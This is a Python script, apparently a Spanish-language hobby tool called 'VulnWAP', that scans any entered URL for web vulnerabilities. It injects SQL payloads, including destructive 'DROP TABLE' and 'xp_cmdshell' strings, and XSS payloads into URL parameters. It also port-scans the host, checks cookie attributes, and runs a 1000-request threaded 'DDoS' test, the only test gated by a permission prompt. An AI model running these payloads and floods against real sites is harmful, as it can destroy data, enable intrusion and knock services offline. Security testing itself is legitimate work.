import requests
import socket
import threading
import time
import re
from requests import get, exceptions
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

def check_sql_injection(target_url):
    # Lista de payloads
    payloads = [
        "'", 
        '"', 
        '`',
        "' OR '1'='1", 
        "'; DROP TABLE testtable; --",
        "'; EXEC xp_cmdshell('cmd.exe')",
        "'; OR 1=1 --",
        "' OR 'x'='x",
        "') OR ('x'='x",
        "'; BEGIN TRANSACTION; DROP TABLE testtable; --",
        "; OR a=a",
        "0'XOR 1=1; --",
        "0' OR 1=1; #",
        "'; DROP TABLE IF EXISTS testtable; --",
        "'; CREATE TABLE testdata(data VARCHAR(50)); --",
        "'; EXEC xp_cmdshell('cmd.exe'); --"
    ]

    # Lista para almacenar resultados
    vulnerable_params = []

    # Extraer parámetros de la URL
    if "?" in target_url:
        parameters = target_url.split("?")[1].split("&")
    else:
        return "No hay parámetros en la URL proporcionada."

    # Iterar a través de los parámetros y payloads
    for param in parameters:
        for payload in payloads:
            # Construye la nueva URL probando el payload
            new_url = target_url.replace(param, param + payload)
            
            try:
                response = requests.get(new_url)

                # Verifica si hay errores comunes de SQL en la respuesta
                sql_errors = ["SQL syntax", "mysql_fetch", "nativecode=1064", "ODBC Microsoft Access Driver"]

                if any(error in response.text for error in sql_errors):
                    vulnerable_params.append(param.split("=")[0])
                    break  # No es necesario probar más payloads en este parámetro si ya encontró una vulnerabilidad
            except requests.RequestException:
                continue  # Si hay un error al hacer la solicitud, continúa con el siguiente payload

    if vulnerable_params:
        return f"Posible vulnerabilidad SQL encontrada en los parámetros: {', '.join(vulnerable_params)}"
    else:
        return "No se encontraron vulnerabilidades SQL evidentes."



def ddos_request(target_url):
    try:
        requests.get(target_url)
        return True
    except:
        return False


def ddos_request(url):
    try:
        response = get(url, timeout=5)  # timeout de 5 segundos
        return response.status_code == 200
    except exceptions.RequestException:
        return False

def check_ddos(target_url):
    num_requests = 1000
    failed_requests = 0
    
    with ThreadPoolExecutor(max_workers=500) as executor:
        results = list(executor.map(ddos_request, [target_url] * num_requests))
    
    failed_requests = results.count(False)
    
    if failed_requests > (num_requests / 2):  # Si más del 50% de las solicitudes fallaron
        return "El sitio puede ser vulnerable a ataques DDoS."
    else:
        return "El sitio parece ser resistente a ataques DDoS."

def check_xss(target_url):
    # Lista de payloads
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(\"XSS\")'>",
        "<div onmouseover='alert(\"XSS\")'>Pasa el ratón por aquí</div>",
        "<body onload='alert(\"XSS\")'>",
        "<iframe src='javascript:alert(\"XSS\");'></iframe>",
        "\"><script>alert('XSS')</script>",
        "' onfocus='alert(\"XSS\")' autofocus='true'",
        "javascript:alert('XSS')",
        "\"><img src=x onmouseover=alert('XSS')>",
        "\"><a href='javascript:alert(\"XSS\")'>Click me!</a>"
    ]

    vulnerable_params = []
    csp_present = False
    csp_value = ""

    if "?" in target_url:
        parameters = target_url.split("?")[1].split("&")
    else:
        return "No hay parámetros en la URL proporcionada."

    for param in parameters:
        for payload in payloads:
            new_url = target_url.replace(param, param + payload)

            try:
                response = requests.get(new_url)
                
                # Comprobar si tiene CSP
                if 'Content-Security-Policy' in response.headers and not csp_present:
                    csp_present = True
                    csp_value = response.headers['Content-Security-Policy']
                
                soup = BeautifulSoup(response.text, "html.parser")

                if payload in str(soup):
                    vulnerable_params.append(param.split("=")[0])
                    break
            except requests.RequestException:
                continue

    report = ""

    if vulnerable_params:
        report += f"Posible vulnerabilidad XSS encontrada en los parámetros: {', '.join(vulnerable_params)}\n"
    else:
        report += "No se encontraron vulnerabilidades XSS evidentes.\n"
    
    if csp_present:
        report += f"La aplicación tiene un encabezado CSP: {csp_value}\n"
    else:
        report += "La aplicación no tiene un encabezado CSP.\n"

    return report


def scan_port(target_ip, port, open_ports, interesting_ports, timeout):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    result = s.connect_ex((target_ip, port))
    if result == 0:
        if port in interesting_ports:
            open_ports[port] = interesting_ports[port]
        else:
            open_ports[port] = "Puerto no estándar"
    s.close()

def check_ports(target, start_port=1, end_port=4000, timeout=60):
    open_ports = {}
    interesting_ports = {         
        21: "FTP (no cifrado)",
        22: "SSH",
        23: "Telnet (no cifrado)",
        25: "SMTP (no cifrado)",
        53: "DNS",
        80: "HTTP (no cifrado)",
        110: "POP3 (no cifrado)",
        139: "NetBIOS",
        143: "IMAP (no cifrado)",
        445: "SMB",
        3306: "MySQL",
        3389: "RDP"
        }  # Lista de puertos "importantes"

    try:
        target_ip = socket.gethostbyname(target)
    except socket.gaierror:
        return f"Error: No se pudo resolver el host {target}. Verifique su conexion y/o nombre de host."

    threads = []
    start_time = time.time()

    for port in range(start_port, end_port + 1):
        if time.time() - start_time > timeout:  # Comprueba si ha superado el tiempo máximo
            break
        
        thread = threading.Thread(target=scan_port, args=(target_ip, port, open_ports, interesting_ports, 1))
        threads.append(thread)
        thread.start()

        # Limite el número de hilos activos para no saturar la red
        while threading.active_count() > 100:
            time.sleep(0.01)

    for thread in threads:
        thread.join()

    return open_ports

def check_cookie_security(target_url):
    try:
        response = requests.get(target_url)
    except requests.RequestException:
        return "No se pudo establecer una conexion con la URL proporcionada."

    cookies_issues = []
    report = ""

    # Obtener la lista de cookies
    cookies = response.headers.get("Set-Cookie", "").split(",")

    if not cookies or cookies == [""]:
        return "La URL proporcionada no establece cookies."

    for cookie in cookies:
        cookie_name = cookie.split("=")[0]
        
        # Verificar atributos Secure, HttpOnly y SameSite
        if "secure" not in cookie.lower():
            cookies_issues.append(f"La cookie '{cookie_name}' no tiene el atributo 'Secure'.")
        if "httponly" not in cookie.lower():
            cookies_issues.append(f"La cookie '{cookie_name}' no tiene el atributo 'HttpOnly'.")
        if "samesite" not in cookie.lower():
            cookies_issues.append(f"La cookie '{cookie_name}' no tiene el atributo 'SameSite'.")

        # Verificar la duración de la cookie
        if "max-age" in cookie or "expires" in cookie:
            # (Solo un ejemplo simple, se podría mejorar con análisis de fechas)
            if "max-age=0" in cookie or "expires=Thu, 01 Jan 1970 00:00:00 GMT" in cookie:
                cookies_issues.append(f"La cookie '{cookie_name}' tiene una duración demasiado corta.")
        
        # Detectar cookies potencialmente predecibles
        predictable_patterns = [r"\d{4,}", r"cookie\d+", r"user\d+", r"session\d+"]
        for pattern in predictable_patterns:
            if re.search(pattern, cookie, re.IGNORECASE):
                cookies_issues.append(f"El valor de la cookie '{cookie_name}' parece ser predecible.")

        # Detectar cookies de terceros
        if "domain" in cookie:
            domain_value = re.search(r"domain=([^;]+)", cookie).group(1)
            if domain_value not in target_url:
                cookies_issues.append(f"La cookie '{cookie_name}' parece ser una cookie de terceros (dominio: {domain_value}).")

    # Verificar política de cookies en la página
    soup = BeautifulSoup(response.text, "html.parser")
    if not soup.find(string=re.compile("política de cookies", re.IGNORECASE)):
        cookies_issues.append("No se encontro una mencion explicita sobre la politica de cookies en la pagina.")

    if cookies_issues:
        report += "\n".join(cookies_issues)
    else:
        report = "Las cookies parecen estar bien configuradas."

    return report


def display_banner():
    banner = """
   .-''''''-.
  /  VulnWAP \\
 |            |
 |  o      o  |
 |  ||    ||  |
 '  ''    ''  '
  \  ------  /
   '-......-'
    """
    print(banner)


def main():
    display_banner()
    # Solicitar la URL objetivo
    target_url = input("Introduce la URL objetivo: ")

    # SQLi
    print("\n[+] Comprobando SQL Injection...")
    sqli_result = check_sql_injection(target_url)
    print(sqli_result)
    
    # Escaneo de Puertos
    print("\n[+] Comprobando puertos abiertos...")
    open_ports = check_ports(target_url.split("//")[-1].split("/")[0])
    if open_ports:
        ports_info = [f"{port} ({description})" for port, description in open_ports.items()]
        ports_result = f"Puertos abiertos encontrados: {', '.join(ports_info)}"
    else:
        ports_result = "No se encontraron puertos abiertos."
    print(ports_result)


    # XSS
    print("\n[+] Comprobando Cross-Site Scripting (XSS)...")
    xss_result = check_xss(target_url)
    print(xss_result)

    # Configuración insegura de cookies
    print("\n[+] Comprobando seguridad de cookies...")
    cookie_result = check_cookie_security(target_url)
    print(cookie_result)
    
    # DDoS (Preguntar si tiene permiso)
    ddos_permission = input("\n¿Tienes permiso para realizar una prueba de robustez DDoS? (s/n): ")
    if ddos_permission.lower() == 's':
        print("\n[+] Comprobando resistencia a DDoS...")
        ddos_result = check_ddos(target_url)
        print(ddos_result)

    # Compilando el informe
    report = "\n----- INFORME FINAL -----\n"
    report += "\n[URL]\n" + target_url
    report += "\n[SQLi]\n" + sqli_result
    if ddos_permission.lower() == 's':
        report += "\n[DDoS]\n" + ddos_result
    report += "\n[XSS]\n" + xss_result
    report += "\n[Puertos Abiertos]\n" + ports_result
    report += "\n[Cookies]\n" + cookie_result
    print(report)

    # Opcionalmente, guardar este informe en un archivo
    save_option = input("\n¿Deseas guardar el informe en un archivo? (s/n): ")
    if save_option.lower() == 's':
        with open("report.txt", "w") as file:
            file.write(report)
        print("Informe guardado en 'report.txt'")


main()

